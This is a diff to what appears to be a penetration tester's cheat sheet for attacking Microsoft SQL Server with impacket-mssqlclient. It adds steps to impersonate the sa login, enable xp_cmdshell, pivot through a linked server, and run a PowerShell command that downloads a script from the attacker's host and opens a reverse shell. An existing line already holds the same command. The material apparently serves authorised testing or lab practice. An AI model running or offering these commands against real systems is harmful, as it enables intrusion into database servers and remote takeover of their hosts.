@@ -1267,10 +1267,15 @@ impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
-+---------- Impersonate ----------+
++---------- Impersonate and Links----------+
 enum_impersonate
-EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-xp_cmdshell whoami /priv
+exec_as_login sa
+enable_xp_cmdshell
+enum_links
+use_link "ZSM-SVRCSQL02"
+enable_xp_cmdshell
+xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP:53/resh.ps1\"); resh -Reverse $MYIP -Port 80"
+use_link ..
 xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP:53/resh.ps1\"); resh -Reverse $MYIP -Port 80"
 
 +---------- Get Hash ----------+
